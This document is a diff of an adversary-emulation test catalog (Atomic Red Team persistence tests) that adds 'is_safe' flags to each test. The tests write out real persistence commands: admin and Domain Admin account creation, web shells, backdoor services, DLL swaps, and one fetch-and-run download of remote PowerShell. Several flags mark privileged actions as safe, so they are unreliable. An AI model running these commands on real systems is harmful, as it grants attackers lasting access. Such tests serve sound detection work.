@@ -26,9 +26,10 @@
         del %temp%\art.bat >nul 2>&1
         del "%USERPROFILE%\desktop\T1037.001-log.txt" >nul 2>&1
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1037/001
-  is_safe: false
+  is_safe: true
 - id: T1037.004
   name: RC Scripts
   description: |-
@@ -49,6 +50,7 @@
       command: sudo echo osascript -e 'tell app "Finder" to display dialog "Hello World"' >> /etc/rc.common
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: rc.common (2)
       type: bash
       platform: linux
@@ -61,6 +63,7 @@
       cleanup: origfilename='/etc/rc.common.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.common;else sudo cp $origfilename /etc/rc.common && sudo rm $origfilename;fi
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: rc.local
       type: sh
       platform: linux
@@ -73,6 +76,7 @@
       cleanup: origfilename='/etc/rc.local.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local && sudo rm $origfilename;fi
       timeout: 60
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1037/004
   is_safe: false
@@ -96,6 +100,7 @@
       cleanup: sudo rm /Library/StartupItems/EvilStartup.plist
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Add launch script to launch daemon
       type: bash
       platform: macos
@@ -112,6 +117,7 @@
         sudo rm /tmp/T1037_005_daemon.txt
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Add launch script to launch agent
       type: bash
       platform: macos
@@ -128,6 +134,7 @@
         sudo rm /tmp/T1037_005_agent.txt
       timeout: 60
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1037/005
   is_safe: false
@@ -174,56 +181,66 @@
         }
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Domain Account and Group Manipulate
       type: powershell
       platform: windows
       command: "$x = Get-Random -Minimum 2 -Maximum 99\n$y = Get-Random -Minimum 2 -Maximum 99\n$z = Get-Random -Minimum 2 -Maximum 99\n$w = Get-Random -Minimum 2 -Maximum 99\n\nImport-Module ActiveDirectory\n$account = \"atr--$x$y$z\"\nNew-ADUser -Name $account -GivenName \"Test\" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False \nAdd-ADGroupMember \"Domain Admins\" $account"
       cleanup: Get-ADUser -LDAPFilter "(&(samaccountname=atr--*)(givenName=Test))" | Remove-ADUser -Confirm:$False
       timeout: 120
+      is_safe: true
     - name: Password Change on Directory Service Restore Mode (DSRM) Account
       type: cmd
       platform: windows
       command: ntdsutil "set dsrm password" "sync from domain account %username%" "q" "q"
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: 'Domain Password Policy Check: Short Password'
       type: powershell
       platform: windows
       command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"Uplow-1\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString Uplow-1 -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to Uplow-1\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"Uplow-1\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
       timeout: 120
+      is_safe: true
     - name: 'Domain Password Policy Check: No Number in Password'
       type: powershell
       platform: windows
       command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"UpperLowerLong-special\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString UpperLowerLong-special -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to UpperLowerLong-special\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UpperLowerLong-special\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
       timeout: 120
+      is_safe: true
     - name: 'Domain Password Policy Check: No Special Character in Password'
       type: powershell
       platform: windows
       command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"UpperLowerLong333noSpecialChar\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString UpperLowerLong333noSpecialChar -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to UpperLowerLong333noSpecialChar\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UpperLowerLong333noSpecialChar\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
       timeout: 120
+      is_safe: true
     - name: 'Domain Password Policy Check: No Uppercase Character in Password'
       type: powershell
       platform: windows
       command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"lower-long-special-333\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString lower-long-special-333 -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to lower-long-special-333\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"lower-long-special-333\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
       timeout: 120
+      is_safe: true
     - name: 'Domain Password Policy Check: No Lowercase Character in Password'
       type: powershell
       platform: windows
       command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"UPPER-LONG-SPECIAL-333\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString UPPER-LONG-SPECIAL-333 -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to UPPER-LONG-SPECIAL-333\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UPPER-LONG-SPECIAL-333\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
       timeout: 120
+      is_safe: true
     - name: 'Domain Password Policy Check: Only Two Character Classes'
       type: powershell
       platform: windows
       command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"onlyUPandLowChars\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString onlyUPandLowChars -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to onlyUPandLowChars\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"onlyUPandLowChars\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
       timeout: 120
+      is_safe: true
     - name: 'Domain Password Policy Check: Common Password Use'
       type: powershell
       platform: windows
       command: "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"Spring$((Get-Date).Year)!\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString Spring$((Get-Date).Year)! -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to Spring$((Get-Date).Year)!\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"Spring$((Get-Date).Year)!\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}"
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1098
-  is_safe: false
+  is_safe: true
 - id: T1098.004
   name: SSH Authorized Keys
   description: Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions, macOS, and ESXi hypervisors commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-...
@@ -241,15 +258,17 @@
       command: if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo "$ssh_authorized_keys" > ~/.ssh/authorized_keys; fi;
       cleanup: unset ssh_authorized_keys
       timeout: 60
+      is_safe: true
     - name: Modify SSH Authorized Keys
       type: sh
       platform: macos
       command: if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo "$ssh_authorized_keys" > ~/.ssh/authorized_keys; fi;
       cleanup: unset ssh_authorized_keys
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1098/004
-  is_safe: false
+  is_safe: true
 - id: T1133
   name: External Remote Services
   description: Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitr...
@@ -281,6 +300,7 @@
         Remove-Item -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -ErrorAction Ignore}
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1133
   is_safe: false
@@ -300,6 +320,7 @@
       cleanup: userdel evil_user
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Create a user account on a FreeBSD system
       type: sh
       platform: linux
@@ -307,6 +328,7 @@
       cleanup: rmuser -y evil_user
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Create a user account on a MacOS system
       type: bash
       platform: macos
@@ -320,6 +342,7 @@
       cleanup: dscl . -delete /Users/evil_user
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Create a new user in a command prompt
       type: cmd
       platform: windows
@@ -327,6 +350,7 @@
       cleanup: net user /del "T1136.001_CMD" >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Create a new user in PowerShell
       type: powershell
       platform: windows
@@ -334,6 +358,7 @@
       cleanup: Remove-LocalUser -Name "T1136.001_PowerShell" -ErrorAction Ignore
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Create a new user in Linux with `root` UID and GID.
       type: bash
       platform: linux
@@ -343,6 +368,7 @@
       cleanup: userdel butter
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Create a new user in FreeBSD with `root` GID.
       type: sh
       platform: linux
@@ -352,6 +378,7 @@
       cleanup: pw userdel butter
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Create a new Windows admin user
       type: cmd
       platform: windows
@@ -361,12 +388,14 @@
       cleanup: net user /del "T1136.001_Admin" >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Create a new Windows admin user via .NET
       type: powershell
       platform: windows
       command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1136/001
   is_safe: false
@@ -390,12 +419,14 @@
         net group "Domain Admins" "T1136.002_Admin" /add /domain
       cleanup: net user "T1136.002_Admin" >nul 2>&1 /del /domain
       timeout: 120
+      is_safe: true
     - name: Create a new account similar to ANONYMOUS LOGON
       type: cmd
       platform: windows
       command: net user "ANONYMOUS  LOGON" "T1136_pass123!" /add /domain
       cleanup: net user "ANONYMOUS  LOGON" >nul 2>&1 /del /domain
       timeout: 120
+      is_safe: true
     - name: Create a new Domain Account using PowerShell
       type: powershell
       platform: windows
@@ -415,6 +446,7 @@
         $User
       cleanup: cmd /c "net user T1136.002_Admin /del >nul 2>&1"
       timeout: 120
+      is_safe: true
     - name: Active Directory Create Admin Account
       type: sh
       platform: linux
@@ -429,6 +461,7 @@
         rm deleteuser.ldif
         rm tempadmin.ldif
       timeout: 60
+      is_safe: true
     - name: Active Directory Create User Account (Non-elevated)
       type: sh
       platform: linux
@@ -443,9 +476,10 @@
         rm deleteuser.ldif
         rm tempadmin.ldif
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1136/002
-  is_safe: false
+  is_safe: true
 - id: T1137
   name: Office Application Startup
   description: |-
@@ -467,9 +501,10 @@
         reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /v Level /f >nul 2>&1
         del %APPDATA%\Microsoft\Outlook\VbaProject.OTM >nul 2>&1
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1137
-  is_safe: false
+  is_safe: true
 - id: T1137.001
   name: Office Template Macros
   description: |-
@@ -487,6 +522,7 @@
       cleanup: "# Registry setting to \"Trust access to the VBA project object model\" in Word\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\n$registryValue = \"AccessVBOM\"\n$registryData1 = \"1\"\n$registryData0 = \"0\"\n# Defines the path each flag file created depending on the original registry state\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\n# Define the path of copied normal template for restoral\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\n# Define the path to the normal template\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\n# Delete the scheduled task created by the Macro\nschtasks /Delete /TN \"OpenCalcTask\" /F | Out-Null\n#Restore the orginal template if the backup copy exists\nif (Test-Path $copyPath)\n{\n  #Delete the injected template\n  Remove-Item -Force $docPath -ErrorAction SilentlyContinue\n  # Restore the original template\n  Rename-Item -Force -Path $copyPath -NewName $docPath -ErrorAction SilentlyContinue\n  Write-Host \"The original template has been restored\"\n}\n  else\n{\n  Write-Host \"The original template is present\"\n}\n#Restore the original state of the registry key\nif (Test-Path $flagPath1) \n{\n  # The value was originally 0, set back to 0\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData0 -PropertyType DWORD -Force | Out-Null\n  Remove-Item -Force $flagPath1 -ErrorAction SilentlyContinue\n  Write-Host \"The original registry state has been restored\"\n} \n  elseif (Test-Path $flagPath2)\n{\n  #The value did not previously exist, delete the value\n  Remove-ItemProperty -Path $registryKey -Name $registryValue | Out-Null\n  Remove-Item -Force $flagPath2 -ErrorAction SilentlyContinue | Out-Null\n  Write-Host \"The original registry state has been restored\"\n}\n  else \n{\n  # The value was already 1, do nothing\n  Write-Host \"The value $registryValue already existed in $registryKey.\"\n}"
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1137/001
   is_safe: false
@@ -505,9 +541,10 @@
         Stop-Process -Name "notepad","WinWord" -ErrorAction Ignore
         Remove-Item "HKCU:\Software\Microsoft\Office test\Special\Perf" -ErrorAction Ignore
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1137/002
-  is_safe: false
+  is_safe: true
 - id: T1137.004
   name: Outlook Home Page
   description: |-
@@ -524,9 +561,10 @@
       command: reg.exe add HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox /v URL /t REG_SZ /d file://PathToAtomicsFolder\T1137.004\src\T1137.004.html /f
       cleanup: reg.exe delete HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox /v URL /f >nul 2>&1
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1137/004
-  is_safe: false
+  is_safe: true
 - id: T1137.006
   name: Add-ins
   description: 'Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (C...'
@@ -549,6 +587,7 @@
         }
       cleanup: Stop-Process -Name "notepad","Excel" -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Persistent Code Execution Via Excel Add-in File (XLL)
       type: powershell
       platform: windows
@@ -576,6 +615,7 @@
         Start-Sleep 3
         Remove-Item "$env:APPDATA\Microsoft\AddIns\notepad.xll" -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Persistent Code Execution Via Word Add-in File (WLL)
       type: powershell
       platform: windows
@@ -585,6 +625,7 @@
         Start-Sleep 3
         Remove-Item "$env:APPDATA\Microsoft\Word\Startup\notepad.wll" -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Persistent Code Execution Via Excel VBA Add-in File (XLAM)
       type: powershell
       platform: windows
@@ -594,6 +635,7 @@
         Start-Sleep 3
         Remove-Item "$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam" -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)
       type: powershell
       platform: windows
@@ -613,9 +655,10 @@
         Start-Sleep 3
         Remove-Item "$env:APPDATA\Microsoft\AddIns\notepad.ppam"  -ErrorAction Ignore
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1137/006
-  is_safe: false
+  is_safe: true
 - id: T1176
   name: Software Extensions
   description: 'Adversaries may abuse software extensions to establish persistent access to victim systems. Software extensions are modular components that enhance or customize the functionality of software applications, including web browsers, Integrated Development Environments (IDEs), and other platforms.(Citation: Chrome Extension C2 Malware)(Citation: Abramovsky VSCode Security) Extensions are typically installed via official marketplaces, app stores, or manually loaded by users, and they often inherit the...'
@@ -653,6 +696,7 @@
         Set-Variable ProgressPreference Continue
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1176
   is_safe: false
@@ -679,6 +723,7 @@
         }
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1505/002
   is_safe: false
@@ -703,9 +748,10 @@
         del C:\inetpub\wwwroot\tests.jsp /q >nul 2>&1
         del C:\inetpub\wwwroot\cmd.aspx /q >nul 2>&1
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1505/003
-  is_safe: false
+  is_safe: true
 - id: T1505.004
   name: IIS Components
   description: 'Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version<...'
@@ -719,15 +765,17 @@
       command: '%windir%\system32\inetsrv\appcmd.exe install module /name:DefaultDocumentModule_Atomic /image:%windir%\system32\inetsrv\defdoc.dll'
       cleanup: '%windir%\system32\inetsrv\appcmd.exe uninstall module DefaultDocumentModule_Atomic'
       timeout: 120
+      is_safe: true
     - name: Install IIS Module using PowerShell Cmdlet New-WebGlobalModule
       type: powershell
       platform: windows
       command: New-WebGlobalModule -Name DefaultDocumentModule_Atomic -Image %windir%\system32\inetsrv\defdoc.dll
       cleanup: Remove-WebGlobalModule -Name DefaultDocumentModule_Atomic
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1505/004
-  is_safe: false
+  is_safe: true
 - id: T1505.005
   name: Terminal Services DLL
   description: |-
@@ -756,6 +804,7 @@
       cleanup: Move-Item -Path "C:\Windows\System32\termsrv_backup.dll" -Destination "C:\Windows\System32\termsrv.dll" -Force -ErrorAction Ignore
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Modify Terminal Services DLL Path
       type: powershell
       platform: windows
@@ -785,6 +834,7 @@
       cleanup: Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\TermService\Parameters" -Name "ServiceDll" -Value "C:\Windows\System32\termsrv.dll"
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1505/005
   is_safe: false
@@ -808,6 +858,7 @@
       cleanup: "echo \"Removing %systemroot%\\wpbbin.exe\" \nRemove-Item -Path \"$env:SystemRoot\\System32\\wpbbin.exe\""
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1542/001
   is_safe: false
@@ -833,6 +884,7 @@
         sudo rm ~/Library/LaunchAgents/com.atomicredteam.plist
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Event Monitor Daemon Persistence
       type: bash
       platform: macos
@@ -844,6 +896,7 @@
         sudo rm /private/var/db/emondClients/randomflag
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Launch Agent - Root Directory
       type: bash
       platform: macos
@@ -856,6 +909,7 @@
         sudo rm /tmp/T1543_001_atomicredteam.txt
       timeout: 60
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1543/001
   is_safe: false
@@ -897,6 +951,7 @@
         systemctl daemon-reload
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Create SysV Service
       type: sh
       platform: linux
@@ -906,6 +961,7 @@
         rm -f /usr/local/etc/rc.d/art-test
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Create Systemd Service file,  Enable the service , Modify and Reload the service.
       type: bash
       platform: linux
@@ -934,6 +990,7 @@
         systemctl daemon-reload
       timeout: 60
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1543/002
   is_safe: false
@@ -959,6 +1016,7 @@
       cleanup: sc config Fax binPath= "C:\WINDOWS\system32\fxssvc.exe" >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Service Installation CMD
       type: cmd
       platform: windows
@@ -970,6 +1028,7 @@
         sc.exe delete AtomicTestService_CMD >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Service Installation PowerShell
       type: powershell
       platform: windows
@@ -982,6 +1041,7 @@
         catch {}
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: TinyTurla backdoor service w64time
       type: cmd
       platform: windows
@@ -1001,6 +1061,7 @@
         reg delete "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /f
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Remote Service Installation CMD
       type: cmd
       platform: windows
@@ -1012,6 +1073,7 @@
         sc.exe \\localhost delete AtomicTestService_CMD >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Modify Service to Run Arbitrary Binary (Powershell)
       type: powershell
       platform: windows
@@ -1024,6 +1086,7 @@
         set-servicebinarypath -name "fax" -path "$env:windir\system32\fxssvc.exe" -erroraction silentlycontinue | out-null
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1543/003
   is_safe: false
@@ -1049,6 +1112,7 @@
         sudo rm /tmp/T1543_004_atomicredteam.txt
       timeout: 60
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1543/004
   is_safe: false
@@ -1086,6 +1150,7 @@
         Get-Process -Name "calc*" -ErrorAction SilentlyContinue | Stop-Process -Force
         Write-Host "[+] Successfully Terminated Calculator"
       timeout: 120
+      is_safe: true
     - name: Python Startup Hook - usercustomize.py (Windows)
       type: powershell
       platform: windows
@@ -1097,6 +1162,7 @@
         & "python.exe" -c "print('Triggering Hook via usercustomize...')"
